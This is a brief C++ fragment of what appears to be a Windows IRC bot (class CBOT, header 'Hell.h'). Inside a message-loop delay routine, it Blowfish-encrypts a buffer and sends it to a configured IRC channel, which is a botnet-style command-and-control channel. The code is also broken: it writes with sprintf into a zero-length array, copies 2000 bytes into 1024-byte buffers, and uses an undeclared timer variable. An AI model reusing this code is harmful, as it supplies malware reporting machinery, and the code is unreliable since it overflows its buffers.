#include "Include.h"
#include "Hell.h"
char msgbuf[1024];
char tmpbuf[1024];
char szBuffer[1024];
#define bufsize 2000

int CBOT::delay(void)
{
	MSG msg;
	DWORD endTick;
	endTick = GetTickCount() + nTimeMs;
	while(GetTickCount() < endTick)
	{
		if(PeekMessage(&msg, NULL, 0, 0, TRUE))
		{
			char blowmsg[] = "";
			sprintf(blowmsg,"%s",szBuffer);
			PBlowCrypt(blowkey,blowmsg);
			_snprintf(tmpbuf,bufsize,"%s",blowmsg);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
	    	BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(), msgbuf);
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	return 0;
}